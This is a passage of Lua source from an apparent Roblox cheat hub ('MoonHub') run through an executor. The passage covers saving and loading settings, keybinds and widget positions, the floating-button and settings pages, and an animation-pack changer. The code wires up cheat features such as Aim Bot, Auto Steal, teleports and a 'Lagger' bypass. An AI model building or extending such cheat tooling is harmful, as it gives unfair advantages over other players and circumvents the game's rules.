					for id in pairs(_floatBtns) do ids[#ids+1] = id end
					return ids
				end)(),
				floatPositions = _floatPositions,
				floatPosV = _FLOAT_POS_VERSION,
				uiLocked = _uiLocked,
				theme             = _currentTheme,
				introEnabled      = _introEnabled,
				mcwBg             = _GH.mcwGetBgState and _GH.mcwGetBgState() or nil,
				lgrBg             = _GH.lgrGetBgState and _GH.lgrGetBgState() or nil,
				personalizeEnabled= _GH.getPersonalize and _GH.getPersonalize() or false,
				autoPlayMode      = State.autoPlayMode,
				uiScaleVal        = _GH.getUIScale and _GH.getUIScale() or nil,
				positions = (function()
					local t = {}
					for id, frame in pairs(_GH.positions or {}) do
						if frame and frame.Parent then
							local p = frame.Position
							t[id] = {p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset}
						end
					end
					return t
				end)(),
				positionsV = _POSITIONS_VERSION,
				toggles = (function()
					local t = {}
					for key, entry in pairs(_GH.allToggles or {}) do
						t[key] = entry.get()
					end
					return t
				end)(),
				inputs = (function()
					local t = {}
					for key, entry in pairs(_GH.allInputs or {}) do
						local n = tonumber(entry.box.Text)
						if n then t[key] = n end
					end
					return t
				end)(),
				kb = {
					DropBR        = ks(kb.DropBR),
					AutoLeft      = ks(kb.AutoLeft),
					AimBot        = ks(kb.AimBot),
					AutoRight     = ks(kb.AutoRight),
					TPDown        = ks(kb.TPDown),
					LagNorm       = ks(kb.LagNorm),
					BatTP         = ks(kb.BatTP),
					AimV2         = ks(kb.AimV2),
					AimV3Kb       = ks(kb.AimV3Kb),
					InstantReset  = ks(kb.InstantReset),
					HideUI        = ks(kb.HideUI),
				},
			}
			if writefile then
				writefile(MH_FILE, HS:JSONEncode(data))
			else
				-- [BUGFIX] warn() only reaches a dev console — invisible on
				-- most mobile executors. A toast makes a genuinely unsaveable
				-- executor visible instead of looking like a silent bug.
				warn("[H] writefile unavailable — executor does not support saving")
				if _GH.showToast and not _GH._writefileWarned then
					_GH._writefileWarned = true
					_GH.showToast("Save unsupported on this executor", "off")
				end
			end
		end)
		if not ok then warn("[H] MH_save error — missing modules?") end
		_saveDebounce = false
	end)
end
_GH.autoSave = MH_save

-- Loading: pushes values straight into State, the widgets, AND restarts active modules
local function MH_load()
	-- [BUGFIX] Same reasoning as the writefile toast above: a mobile
	-- executor missing readfile/isfile fails completely silently otherwise
	-- (warn() alone never reaches a mobile user), which reads exactly like
	-- "positions aren't restored" with no visible cause.
	local ok, data = pcall(function()
		if type(readfile) ~= "function" then
			warn("[MoonHub] readfile missing on this executor")
			if _GH.showToast then _GH.showToast("Load unsupported: no readfile", "off") end
			return nil
		end
		if type(isfile) ~= "function" then
			warn("[MoonHub] isfile missing on this executor")
			if _GH.showToast then _GH.showToast("Load unsupported: no isfile", "off") end
			return nil
		end
		local fileExists = false
		local fOk, fErr = pcall(function() fileExists = isfile(MH_FILE) end)
		if not fOk then warn("[MoonHub] isfile raised an error: "..tostring(fErr)); return nil end
		if not fileExists then return nil end
		local rOk, rContent = pcall(function() return readfile(MH_FILE) end)
		if not rOk then warn("[MoonHub] readfile raised an error: "..tostring(rContent)); return nil end
		local dOk, decoded = pcall(function() return HS:JSONDecode(rContent) end)
		if not dOk then warn("[MoonHub] JSONDecode failed: "..tostring(decoded)); return nil end
		return decoded
	end)
	if not ok or not data then
		return false
	end
	local loadOk = pcall(function()
		if data.normalSpeed then State.normalSpeed=data.normalSpeed
			if _G._mhInputBoxesRef.normalSpeed then _G._mhInputBoxesRef.normalSpeed.Text=tostring(data.normalSpeed) end end
		if data.carrySpeed then State.carrySpeed=data.carrySpeed
			if _G._mhInputBoxesRef.carrySpeed then _G._mhInputBoxesRef.carrySpeed.Text=tostring(data.carrySpeed) end end
		if data.laggerSpeed then State.laggerSpeed=data.laggerSpeed
			if _G._mhInputBoxesRef.laggerSpeed then _G._mhInputBoxesRef.laggerSpeed.Text=tostring(data.laggerSpeed) end end
		if data.laggerCarrySpeed then State.laggerCarrySpeed=data.laggerCarrySpeed
			if _G._mhInputBoxesRef.laggerCarrySpeed then _G._mhInputBoxesRef.laggerCarrySpeed.Text=tostring(data.laggerCarrySpeed) end end
		if data.speedType=="normal" or data.speedType=="carry" then State.speedType=data.speedType end

		-- Only config VALUES are restored here (speeds, keybinds, radius,
		-- mode...) — ON/OFF feature states are never auto-restarted, to
		-- match the "everything OFF at execution" policy. The user
		-- re-enables whichever features they want each session.
		if data.aimSpeed then AB.SPEED=data.aimSpeed end
		if data.grabRadius then AutoSteal.Radius=data.grabRadius end
		if data.autoGrabMethod and _GH.setAutoGrabMethod then
			_GH.setAutoGrabMethod(data.autoGrabMethod)
			if setAutoGrabMethodUI then setAutoGrabMethodUI(data.autoGrabMethod) end
		end
		if data.autoPlayMode then
			if setAutoPlayModeUI then setAutoPlayModeUI(data.autoPlayMode)
			else State.autoPlayMode = data.autoPlayMode end
		end
		if data.uiScaleVal and _GH.applyUIScale then _GH.applyUIScale(data.uiScaleVal) end
		-- Window/widget positions: restored before anything else so frames
		-- never flash at their default position on load.
		-- [BUGFIX] Same versioning idiom as _FLOAT_POS_VERSION above, instead
		-- of permanently excluding "lagger": a save's positions only get
		-- restored if they were written under the CURRENT _POSITIONS_VERSION.
		-- A save from before Lagger's default moved (no positionsV, or an
		-- older one) is discarded once — after that one clean load, every
		-- widget (Lagger included) drags, saves and restores normally again.
		if type(data.positions) == "table" then
			if data.positionsV == _POSITIONS_VERSION then
				local restored = 0
				for id, pos in pairs(data.positions) do
					local frame = _GH.positions and _GH.positions[id]
					if frame and type(pos) == "table" and pos[1] then
						frame.Position = UDim2.new(pos[1], pos[2], pos[3], pos[4])
						restored = restored + 1
					end
				end
				-- One-time confirmation so "did my layout actually restore?"
				-- has a visible answer instead of being a silent guess.
				if restored > 0 and _GH.showToast then
					_GH.showToast("Layout restored ("..restored..")", "info")
				end
			else
				-- Save predates this version's position defaults (e.g. Lagger's
				-- old off-screen spot) — skipped once by design, not a bug.
				-- Surfaced so it doesn't look identical to "still broken".
				if _GH.showToast then
					_GH.showToast("Old layout save reset (one-time)", "info")
				end
			end
		end

		-- Numeric input rows: restore value + re-apply effect (FOV, radius…)
		if type(data.inputs) == "table" then
			for key, value in pairs(data.inputs) do
				local entry = _GH.allInputs and _GH.allInputs[key]
				if entry and type(value) == "number" then
					entry.box.Text = tostring(value)
					pcall(entry.onChange, value)
				end
			end
		end

		-- Theme must be applied BEFORE toggle restore: TweenService captures C_ON_BG
		-- by value at Create() time, so restoring toggles before applyTheme would
		-- bake the default-blue into all pill tweens even in noir mode.
		if data.theme == "default" or data.theme == "noir" or data.theme == "crimson"
			or data.theme == "white" or data.theme == "purple" or data.theme == "moon" then
			applyTheme(data.theme)
		end
		-- Plain flag, like theme above — read directly here (before
		-- _MH_buildUI runs) since the intro block is the very first thing
		-- that executes inside it and needs the restored value immediately,
		-- not via the toggles registry (which doesn't exist yet at this point).
		if type(data.introEnabled) == "boolean" then
			_introEnabled = data.introEnabled
		end

		-- Both background pickers (selected image + visibility, main panel
		-- and Lagger) — weren't persisted before. Bridges are guarded
		-- (nil-safe) since they're only set once their respective widget
		-- has actually built; by this point in MH_load (called near the
		-- very end of the whole UI build) they always have.
		if _GH.mcwSetBgState then _GH.mcwSetBgState(data.mcwBg) end
		if _GH.lgrSetBgState then _GH.lgrSetBgState(data.lgrBg) end
		-- Applied LAST and explicitly: mcwSetBgState/applyTheme above both
		-- flip personalize as a side effect of restoring an image/theme, so
		-- this is the actual final word on whether it ends up on or off —
		-- matches whatever was truly active the moment the hub last saved.
		if _GH.setPersonalize and type(data.personalizeEnabled) == "boolean" then
			_GH.setPersonalize(data.personalizeEnabled)
		end

		-- Toggle rows: restore saved state (ON and OFF) including defaults-ON
		-- features. [REMOVED] The old "Settings::Speed Bypass" force-off
		-- exception is gone along with the widget itself — nothing left that
		-- needs one.
		if type(data.toggles) == "table" then
			for key, on in pairs(data.toggles) do
				local entry = _GH.allToggles and _GH.allToggles[key]
				if entry then
					if on then
						if entry.onToggle then pcall(entry.onToggle, true) end
						entry.set(true)
					else
						if entry.onToggle then pcall(entry.onToggle, false) end
						entry.set(false)
					end
				end
			end
		end

		if data.kb then
			local kb = _GH.MH_KB
			if kb then
				for name, entry in pairs(data.kb) do
					if kb[name] then
						if entry.key and Enum.KeyCode[entry.key] then kb[name].key = Enum.KeyCode[entry.key] end
						if entry.gp  and Enum.KeyCode[entry.gp]  then kb[name].gp  = Enum.KeyCode[entry.gp]  end
					end
				end
			end
		end

		-- Floating buttons: positions first, then spawn, then lock.
		-- Positions saved under an older layout version are discarded so
		-- buttons don't restore to stale/overlapping coordinates.
		-- Same visibility gap as the generic `positions` table had: this
		-- silently discarding a mismatched-version save reads identically to
		-- "float button positions just don't save", with no visible cause.
		if type(data.floatPositions) == "table" then
			if data.floatPosV == _FLOAT_POS_VERSION then
				local n = 0
				for id, pos in pairs(data.floatPositions) do
					_floatPositions[id] = pos
					n = n + 1
				end
				if n > 0 and _GH.showToast then
					_GH.showToast("Button positions restored ("..n..")", "info")
				end
			elseif _GH.showToast then
				_GH.showToast("Old button layout reset (one-time)", "info")
			end
		end
		-- Floating buttons never auto-spawn from a saved session — matches
		-- the "everything OFF at execution" policy. The user re-toggles
		-- whichever ones they want each time (positions are still remembered
		-- once they do, via floatPositions above).
		if type(data.uiLocked) == "boolean" and data.uiLocked then
			setDragLock(true)
			lockTitleBtn.Text = "🔒"; lockTitleBtn.TextColor3 = C_RED
		end
	end)
	if not loadOk then warn("[H] MH_load failed partway through — check referenced modules") end

	-- Defer one frame so any float buttons spawned by toggle restore are fully
	-- registered before we re-apply their active color against the loaded theme.
	task.defer(function()
		if _GH.refreshFloatActiveColors then _GH.refreshFloatActiveColors() end
	end)

	return true
end

local _floatRowSetters = {}
buildPage("Buttons", function()
	-- Right at the top: direct toggle that spawns the Speed Booster widget
	-- itself (not an intermediary floating button), shown in front.
	UIB.makeSectionLabel("Speed Booster")
	UIB.makeToggleRow("Speed Booster", false, function(on)
		if _GH.spW then
			_GH.spW.Visible = on
			if on then _GH.spW.ZIndex = 1000 end
		end
	end)
	UIB.makeGap(4)

	UIB.makeSectionLabel("Floating Buttons")
	UIB.makeGap(2)

	local FLOAT_LABELS = {
		{id="aimbot",      name="Aim Bot"},
		{id="aimv2",       name="Aim V2"},
		{id="dropbr",      name="Drop Brainrot"},
		{id="autoleft",    name="Auto Left"},
		{id="autoright",   name="Auto Right"},
		{id="tpdown",      name="TP Down"},
		{id="battp",       name="Bat TP"},
		{id="instareset",  name="Instant Reset"},
	}

	do
		-- Select All / Unselect All: spawns or despawns every floating
		-- button in one click and keeps their individual toggle rows in
		-- sync (calling the setter directly only updates the visual — the
		-- actual spawn/despawn call is what a real click does too).
		local allRow = Instance.new("Frame", currentPage)
		allRow.Size = UDim2.new(1,0,0,30); allRow.BackgroundTransparency = 1
		allRow.LayoutOrder = LO()
		local allLL = Instance.new("UIListLayout", allRow)
		allLL.FillDirection = Enum.FillDirection.Horizontal
		allLL.Padding = UDim.new(0,8)

		local selAllBtn = Instance.new("TextButton", allRow)
		selAllBtn.Size = UDim2.new(0.5,-4,1,0); selAllBtn.BackgroundColor3 = C_ON_BG
		selAllBtn.BackgroundTransparency = 0.1; selAllBtn.BorderSizePixel = 0
		selAllBtn.Text = "Select All"; selAllBtn.TextColor3 = C_MOON
		selAllBtn.Font = Enum.Font.GothamBold; selAllBtn.TextSize = 10
		selAllBtn.AutoButtonColor = false; addCorner(selAllBtn,10); addLivingStroke(selAllBtn,1)

		local unselAllBtn = Instance.new("TextButton", allRow)
		unselAllBtn.Size = UDim2.new(0.5,-4,1,0); unselAllBtn.BackgroundColor3 = C_OFF_BG
		unselAllBtn.BackgroundTransparency = 0.3; unselAllBtn.BorderSizePixel = 0
		unselAllBtn.Text = "Unselect All"; unselAllBtn.TextColor3 = C_DIM
		unselAllBtn.Font = Enum.Font.GothamBold; unselAllBtn.TextSize = 10
		unselAllBtn.AutoButtonColor = false; addCorner(unselAllBtn,10); addLivingStroke(unselAllBtn,1)

		selAllBtn.MouseButton1Click:Connect(function()
			for _, entry in ipairs(FLOAT_LABELS) do
				makeFloatButton(entry.id)
				if _floatRowSetters[entry.id] then _floatRowSetters[entry.id](true) end
			end
			if _GH.autoSave then _GH.autoSave() end
			if _GH.showToast then _GH.showToast("All Buttons Shown", "on") end
		end)
		unselAllBtn.MouseButton1Click:Connect(function()
			for _, entry in ipairs(FLOAT_LABELS) do
				removeFloatButton(entry.id)
				if _floatRowSetters[entry.id] then _floatRowSetters[entry.id](false) end
			end
			if _GH.autoSave then _GH.autoSave() end
			if _GH.showToast then _GH.showToast("All Buttons Hidden", "off") end
		end)
	end
	UIB.makeGap(4)

	for _, entry in ipairs(FLOAT_LABELS) do
		_floatRowSetters[entry.id] = UIB.makeToggleRow(entry.name, false, function(on)
			if on then makeFloatButton(entry.id) else removeFloatButton(entry.id) end
			if _GH.autoSave then _GH.autoSave() end
		end)
	end
end)

buildPage("Settings", function()
	UIB.makeSectionLabel("Auto Play")
	do
		local apModes={"Full","Half"}
		local function getIdx()
			for i,m in ipairs(apModes) do if m==State.autoPlayMode then return i end end; return 1
		end
		local apRow=Instance.new("Frame",currentPage)
		apRow.Size=UDim2.new(1,0,0,32);apRow.BackgroundColor3=C_ROW;apRow.BackgroundTransparency=0.35
		apRow.BorderSizePixel=0;apRow.LayoutOrder=LO();addCorner(apRow,12);addLivingStroke(apRow,1)
		local apl=Instance.new("TextLabel",apRow)
		apl.Size=UDim2.new(0,110,1,0);apl.Position=UDim2.new(0,14,0,0)
		apl.BackgroundTransparency=1;apl.Text="Auto Play Mode";apl.TextColor3=C_WHITE
		apl.Font=Enum.Font.GothamBold;apl.TextSize=10;apl.TextXAlignment=Enum.TextXAlignment.Left
		addLivingTextGradient(apl)
		local apBtn=Instance.new("TextButton",apRow)
		apBtn.Size=UDim2.new(0,70,0,22);apBtn.Position=UDim2.new(1,-80,0.5,-11)
		apBtn.BackgroundColor3=C_ON_BG;apBtn.BackgroundTransparency=0.1;apBtn.BorderSizePixel=0
		apBtn.Text=State.autoPlayMode;apBtn.TextColor3=C_MOON
		apBtn.Font=Enum.Font.GothamBold;apBtn.TextSize=10;apBtn.AutoButtonColor=false
		addCorner(apBtn,6);addLivingStroke(apBtn,1)
		apBtn.MouseButton1Click:Connect(function()
			local idx=(getIdx()%#apModes)+1
			State.autoPlayMode=apModes[idx];apBtn.Text=apModes[idx]
		end)
	end
	UIB.makeGap(4)
	UIB.makeSectionLabel("UI Scale")
	UIB.makeGap(2)
	do
		-- S=1, M=4, L=7, XL=10 (on applyUIScale's 1-10 scale)
		local presets = {{"S",1},{"M",4},{"L",7},{"XL",10}}
		local scRow = Instance.new("Frame", currentPage)
		scRow.Size = UDim2.new(1,0,0,34); scRow.BackgroundColor3 = C_ROW
		scRow.BackgroundTransparency = 0.35; scRow.BorderSizePixel = 0
		scRow.LayoutOrder = LO(); addCorner(scRow,12); addLivingStroke(scRow,1)
		local ll2 = Instance.new("UIListLayout", scRow)
		ll2.FillDirection = Enum.FillDirection.Horizontal
		ll2.VerticalAlignment = Enum.VerticalAlignment.Center
		ll2.HorizontalAlignment = Enum.HorizontalAlignment.Center
		ll2.Padding = UDim.new(0,8)
		for _, preset in ipairs(presets) do
			local lbl2, val = preset[1], preset[2]
			local btn2 = Instance.new("TextButton", scRow)
			btn2.Size = UDim2.new(0,48,0,24); btn2.BackgroundColor3 = C_ON_BG
			btn2.BackgroundTransparency = 0.3; btn2.BorderSizePixel = 0
			btn2.Text = lbl2; btn2.TextColor3 = C_MOON
			btn2.Font = Enum.Font.GothamBold; btn2.TextSize = 11
			btn2.AutoButtonColor = false
			addCorner(btn2,8); addLivingStroke(btn2,1)
			btn2.MouseButton1Click:Connect(function()
				if _GH.applyUIScale then _GH.applyUIScale(val) end
				for _, b2 in ipairs(scRow:GetChildren()) do
					if b2:IsA("TextButton") then
						b2.BackgroundTransparency = 0.3; b2.TextColor3 = C_MOON
					end
				end
				btn2.BackgroundTransparency = 0.05; btn2.TextColor3 = C_WHITE
			end)
		end
	end

	UIB.makeGap(4)
	do
		-- Snaps the main panel AND every default-grid floating button back
		-- to their starting spot — the fix for "dragged everything into a
		-- mess" without having to place each one back by hand.
		local resetRow = Instance.new("Frame", currentPage)
		resetRow.Size = UDim2.new(1,0,0,32); resetRow.BackgroundColor3 = C_ROW
		resetRow.BackgroundTransparency = 0.35; resetRow.BorderSizePixel = 0
		resetRow.LayoutOrder = LO(); addCorner(resetRow,12); addLivingStroke(resetRow,1)
		local resetClk = Instance.new("TextButton", resetRow)
		resetClk.Size = UDim2.new(1,0,1,0); resetClk.BackgroundTransparency = 1
		resetClk.Text = "↺  Reset Position"; resetClk.TextColor3 = C_WHITE
		resetClk.Font = Enum.Font.GothamBold; resetClk.TextSize = 10
		addLivingTextGradient(resetClk)
		resetClk.MouseButton1Click:Connect(function()
			if _GH.resetMainPosition then _GH.resetMainPosition() end
			if _GH.resetFloatPositions then _GH.resetFloatPositions() end
			if _GH.showToast then _GH.showToast("Position Reset", "info") end
		end)
	end

	UIB.makeGap(2)
	do
		-- Drives every toggle/input across the whole hub back to its own
		-- default (see resetAllSettings, defined near the toggle registry
		-- above) — one button instead of hunting down each row by hand.
		local resetAllRow = Instance.new("Frame", currentPage)
		resetAllRow.Size = UDim2.new(1,0,0,32); resetAllRow.BackgroundColor3 = C_ROW
		resetAllRow.BackgroundTransparency = 0.35; resetAllRow.BorderSizePixel = 0
		resetAllRow.LayoutOrder = LO(); addCorner(resetAllRow,12); addLivingStroke(resetAllRow,1)
		local resetAllClk = Instance.new("TextButton", resetAllRow)
		resetAllClk.Size = UDim2.new(1,0,1,0); resetAllClk.BackgroundTransparency = 1
		resetAllClk.Text = "⟲  Reset All Settings"; resetAllClk.TextColor3 = C_RED
		resetAllClk.Font = Enum.Font.GothamBold; resetAllClk.TextSize = 10
		addLivingTextGradient(resetAllClk)
		resetAllClk.MouseButton1Click:Connect(function()
			if _GH.resetAllSettings then _GH.resetAllSettings() end
		end)
	end

	do
		-- When on, dragging any one spawned floating button carries every
		-- other spawned one along by the same delta — moves the whole group
		-- as a block instead of repositioning each one individually.
		UIB.makeToggleRow("Move Buttons Together", false, function(on)
			if _GH.setFloatLinkMove then _GH.setFloatLinkMove(on) end
		end)
	end

	UIB.makeGap(4)
	UIB.makeSectionLabel("Bypass")
	UIB.makeToggleRow("Lagger", false, function(on)
		if _lgrBypassWidget then
			_lgrBypassWidget.Visible = on
			-- Même convention que Speed Booster (_GH.spW.ZIndex = 1000) :
			-- garantit que le panneau passe au premier plan à l'activation.
			if on then _lgrBypassWidget.ZIndex = 1000 end
		end
	end)

	-- ── ANIMATION CHANGER (22 packs, ◀ ▶ navigation) ──────────────
	UIB.makeGap(4)
	UIB.makeSectionLabel("Animation Changer")
	do
		local ANIM_PACKS = {
			["Robot"]       = {WalkAnim=616013216,RunAnim=616010382,JumpAnim=616008936,FallAnim=616005863,SwimIdle=616012453,Swim=616011509,Animation1=616006778,Animation2=616008087,ClimbAnim=616003713},
			["Vampire"]     = {WalkAnim=1083178339,RunAnim=1083216690,JumpAnim=1083218792,FallAnim=1083189019,SwimIdle=1083222527,Swim=1083225406,Animation1=1083445855,Animation2=1083450167,ClimbAnim=1083182000},
			["Superhero"]   = {WalkAnim=616013216,RunAnim=616111765,JumpAnim=616111876,FallAnim=616108001,SwimIdle=616112625,Swim=616112437,Animation1=616111295,Animation2=616111295,ClimbAnim=616110833},
			["Cartoony"]    = {WalkAnim=742640026,RunAnim=742638842,JumpAnim=742637942,FallAnim=742637151,SwimIdle=742639220,Swim=742639812,Animation1=742635424,Animation2=742636889,ClimbAnim=742636889},
			["Ninja"]       = {WalkAnim=656118852,RunAnim=656118852,JumpAnim=656117878,FallAnim=656115606,SwimIdle=656119721,Swim=656119721,Animation1=656117878,Animation2=656118341,ClimbAnim=656114359},
			["Adidas Sports"]    ={WalkAnim=18537392113,RunAnim=18537384940,JumpAnim=18537380791,FallAnim=18537367238,SwimIdle=18537387180,Swim=18537389531,Animation1=18537376492,Animation2=18537371272,ClimbAnim=18537363391},
			["Adidas Community"] ={WalkAnim=122150855457006,RunAnim=82598234841035,JumpAnim=75290611992385,FallAnim=98600215928904,SwimIdle=109346520324160,Swim=133308483266208,Animation1=122257458498464,Animation2=102357151005774,ClimbAnim=88763136693023},
			["Adidas Aura"]      ={WalkAnim=83842218823011,RunAnim=118320322718866,JumpAnim=109996626521204,FallAnim=95603166884636,SwimIdle=94922130551805,Swim=134530128383903,Animation1=110211186840347,Animation2=114191137265065,ClimbAnim=97824616490448},
			["Stylish"]     = {WalkAnim=616122287,RunAnim=616117076,JumpAnim=616119360,FallAnim=616115533,SwimIdle=616120448,Swim=616121235,Animation1=616117076,Animation2=616120861,ClimbAnim=616115533},
			["Levitation"]  = {WalkAnim=616013216,RunAnim=616006778,JumpAnim=616008936,FallAnim=616005863,SwimIdle=616011509,Swim=616012453,Animation1=616006778,Animation2=616008087,ClimbAnim=616003713},
			["Astronaut"]   = {WalkAnim=891667138,RunAnim=891636393,JumpAnim=891627522,FallAnim=891617961,SwimIdle=891639666,Swim=891663592,Animation1=891621366,Animation2=891633237,ClimbAnim=891609353},
			["Werewolf"]    = {WalkAnim=1083195517,RunAnim=1083194401,JumpAnim=1083218792,FallAnim=1083189019,SwimIdle=1083222527,Swim=1083225406,Animation1=1083462077,Animation2=1083450167,ClimbAnim=1083182000},
			["Knight"]      = {WalkAnim=658831042,RunAnim=658831794,JumpAnim=658832070,FallAnim=658831500,SwimIdle=658832437,Swim=658832807,Animation1=657595757,Animation2=657600338,ClimbAnim=658830056},
			["Pirate"]      = {WalkAnim=750785693,RunAnim=750783738,JumpAnim=750782230,FallAnim=750781874,SwimIdle=750785579,Swim=750784579,Animation1=750781874,Animation2=750782770,ClimbAnim=750779899},
			["Toy"]         = {WalkAnim=782841498,RunAnim=782843345,JumpAnim=782847020,FallAnim=782846423,SwimIdle=782844582,Swim=782844235,Animation1=782842708,Animation2=782845736,ClimbAnim=782843869},
			["Elder"]       = {WalkAnim=1092112116,RunAnim=1092114823,JumpAnim=1092114571,FallAnim=1092114319,SwimIdle=1092113582,Swim=1092113478,Animation1=1092110164,Animation2=1092110049,ClimbAnim=1092113209},
			["Bubbly"]      = {WalkAnim=910034870,RunAnim=910025107,JumpAnim=910016857,FallAnim=910001910,SwimIdle=910030921,Swim=910028158,Animation1=910004836,Animation2=910009958,ClimbAnim=910019264},
			["Zombie"]      = {WalkAnim=616163682,RunAnim=616163682,JumpAnim=616161682,FallAnim=616157476,SwimIdle=616165109,Swim=616164682,Animation1=616158929,Animation2=616160636,ClimbAnim=616156119},
			["Sneaky"]      = {WalkAnim=1132510133,RunAnim=1132494274,JumpAnim=1132489853,FallAnim=1132469004,SwimIdle=1132506407,Swim=1132500520,Animation1=1132473842,Animation2=1132477671,ClimbAnim=1132461372},
			["Patrol"]      = {WalkAnim=1151231493,RunAnim=1150967949,JumpAnim=1150944216,FallAnim=1148863382,SwimIdle=1151221899,Swim=1151204998,Animation1=1149612882,Animation2=1150842221,ClimbAnim=1148811837},
			["Popstar"]     = {WalkAnim=1212980338,RunAnim=1212980348,JumpAnim=1212954642,FallAnim=1212900995,SwimIdle=1212998578,Swim=1212852603,Animation1=1212900985,Animation2=1212954651,ClimbAnim=1213044953},
			["Confident"]   = {WalkAnim=1070017263,RunAnim=1070001516,JumpAnim=1069984524,FallAnim=1069973677,SwimIdle=1070012133,Swim=1070009914,Animation1=1069977950,Animation2=1069987858,ClimbAnim=1069946257},
			["Princess"]    = {WalkAnim=941028902,RunAnim=941015281,JumpAnim=941008832,FallAnim=941000007,SwimIdle=941025398,Swim=941018893,Animation1=941003647,Animation2=941013098,ClimbAnim=940996062},
			["Cowboy"]      = {WalkAnim=1014421541,RunAnim=1014401683,JumpAnim=1014394726,FallAnim=1014384571,SwimIdle=1014411816,Swim=1014406523,Animation1=1014390418,Animation2=1014398616,ClimbAnim=1014380606},
		}
		local ANIM_ORDER = {"Default","Robot","Vampire","Superhero","Cartoony","Ninja","Adidas Sports","Adidas Community","Adidas Aura","Stylish","Levitation","Astronaut","Werewolf","Knight","Pirate","Toy","Elder","Bubbly","Zombie","Sneaky","Patrol","Popstar","Confident","Princess","Cowboy"}
		local _animEnabled = false
		local _animIndex = 1

		-- Robust method: direct Animator:LoadAnimation + Heartbeat loop that
		-- keeps reapplying (handles cases where the game regenerates Animate)
		local _animTracks = {}
		local function stopAllTracks()
			for _, tr in ipairs(_animTracks) do pcall(function() tr:Stop(0) end) end
			_animTracks = {}
		end

		local function applyAnimPack(packName)
			stopAllTracks()
			local c = LP.Character; if not c then return end
			local hum = c:FindFirstChildOfClass("Humanoid"); if not hum then return end
			local animator = hum:FindFirstChildOfClass("Animator")
			if not animator then animator = Instance.new("Animator", hum) end
			local pack = ANIM_PACKS[packName]; if not pack then return end

			-- 1. Update Animate script IDs first (walk/run/jump/fall/climb/swim)
			local animate = c:FindFirstChild("Animate")
			if animate then
				local function setAnim(folder,slot,id)
					if not id then return end
					local f=animate:FindFirstChild(folder); if not f then return end
					local a=f:FindFirstChild(slot)
					if a and a:IsA("Animation") then a.AnimationId="rbxassetid://"..tostring(id) end
				end
				setAnim("walk","WalkAnim",pack.WalkAnim)
				setAnim("run","RunAnim",pack.RunAnim)
				setAnim("jump","JumpAnim",pack.JumpAnim)
				setAnim("fall","FallAnim",pack.FallAnim)
				setAnim("idle","Animation1",pack.Animation1)
				setAnim("idle","Animation2",pack.Animation2)
				setAnim("climb","ClimbAnim",pack.ClimbAnim)
				setAnim("swimidle","SwimIdle",pack.SwimIdle)
				setAnim("swim","Swim",pack.Swim)
			end

			-- 2. Stop all currently playing tracks so Animate restarts with new IDs
			for _, tr in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() tr:Stop(0) end) end

			-- 3. Force-play idle immediately for visual feedback (Animate handles rest)
			local slots = {
				{id=pack.Animation1, prio=Enum.AnimationPriority.Idle,     loop=true},
				{id=pack.WalkAnim,   prio=Enum.AnimationPriority.Movement, loop=true},
			}
			for _, s in ipairs(slots) do
				if s.id then
					local anim = Instance.new("Animation")
					anim.AnimationId = "rbxassetid://"..tostring(s.id)
					local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
					if ok and track then
						track.Priority = s.prio
						track.Looped = s.loop
						track:Play(0)
						table.insert(_animTracks, track)
					end
				end
			end
		end

		local function clearAnimPack()
			stopAllTracks()
		end

		-- Navigation row: ◀  [Name]  ▶
		local animRow = Instance.new("Frame", currentPage)
		animRow.Size=UDim2.new(1,0,0,36); animRow.BackgroundColor3=C_ROW
		animRow.BackgroundTransparency=0.35; animRow.BorderSizePixel=0; animRow.LayoutOrder=LO()
		addCorner(animRow,10); addLivingStroke(animRow,1)

		local animPrevBtn = Instance.new("TextButton", animRow)
		animPrevBtn.Size=UDim2.new(0,36,1,0); animPrevBtn.Position=UDim2.new(0,0,0,0)
		animPrevBtn.BackgroundTransparency=1; animPrevBtn.Text="◀"
		animPrevBtn.TextColor3=C_MOON2; animPrevBtn.Font=Enum.Font.GothamBlack; animPrevBtn.TextSize=16
		animPrevBtn.AutoButtonColor=false

		local animNameLbl = Instance.new("TextLabel", animRow)
		animNameLbl.Size=UDim2.new(1,-72,1,0); animNameLbl.Position=UDim2.new(0,36,0,0)
		animNameLbl.BackgroundTransparency=1; animNameLbl.Text="Default"
		animNameLbl.TextColor3=C_WHITE; animNameLbl.Font=Enum.Font.GothamBlack; animNameLbl.TextSize=12
		animNameLbl.TextXAlignment=Enum.TextXAlignment.Center
		addLivingTextGradient(animNameLbl)

		local animNextBtn = Instance.new("TextButton", animRow)
		animNextBtn.Size=UDim2.new(0,36,1,0); animNextBtn.Position=UDim2.new(1,-36,0,0)
		animNextBtn.BackgroundTransparency=1; animNextBtn.Text="▶"
		animNextBtn.TextColor3=C_MOON2; animNextBtn.Font=Enum.Font.GothamBlack; animNextBtn.TextSize=16
		animNextBtn.AutoButtonColor=false

		local function selectAnim(idx)
			_animIndex = ((idx - 1) % #ANIM_ORDER) + 1
			local name = ANIM_ORDER[_animIndex]
			animNameLbl.Text = name
			if _animEnabled then
				if name == "Default" then clearAnimPack() else applyAnimPack(name) end
			end
		end

		animPrevBtn.MouseButton1Click:Connect(function() selectAnim(_animIndex - 1) end)
		animNextBtn.MouseButton1Click:Connect(function() selectAnim(_animIndex + 1) end)

		UIB.makeToggleRow("Animation Changer", false, function(on)
			_animEnabled = on
			local name = ANIM_ORDER[_animIndex]
			if on then
				if name == "Default" then clearAnimPack() else applyAnimPack(name) end
			else
				clearAnimPack()
			end
		end)

		LP.CharacterAdded:Connect(function()
			task.wait(1)
			_animTracks = {}
			if _animEnabled then
				local name = ANIM_ORDER[_animIndex]
				if name ~= "Default" then applyAnimPack(name) end
			end
		end)
	end

	UIB.makeGap(4)
	UIB.makeSectionLabel("Background")
	UIB.makeGap(2)
	do
		-- [REMPLACE la grille 6 couleurs] Un seul bouton "Background" ouvre
		-- une fenêtre Customize (même motif que le widget Lagger) avec des
		-- miniatures cliquables — appliquées EN DIRECT sur _bgImageLabel
		-- (déjà existant, ligne ~3282 : fond du panneau principal, jusqu'ici
		-- fixé à une seule image, on/off via l'ancien thème "Moon" uniquement).
		-- applyTheme()/_THEME_DEFS restent intacts (utilisés ailleurs pour
		-- les couleurs C_MOON/C_BG/etc.), seule la grille de sélection de
		-- couleur disparaît de cette page.
		-- Each entry's `color` is that specific image's own dominant/accent
		-- tone (measured by pixel analysis — the most vivid or brightest
		-- color actually present in it), used below for that tile's own
		-- selection stroke instead of one generic accent for all of them,
		-- so the highlight blends with whichever image it's on.
		local BG_OPTIONS = {
